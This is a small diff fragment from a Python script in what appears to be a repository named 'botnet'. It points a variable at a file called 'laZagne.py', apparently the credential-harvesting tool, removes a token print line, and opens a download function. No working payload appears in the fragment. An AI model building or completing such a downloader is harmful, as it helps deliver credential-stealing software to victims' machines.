@@ -4,7 +4,6 @@ import base64
 
 urlb = "https://api.github.com/repos/Pol-Ruiz/botnet/edit/main/laZagne.py"
 
-print(token)
 
 def downloadFile(urlb):
     global token
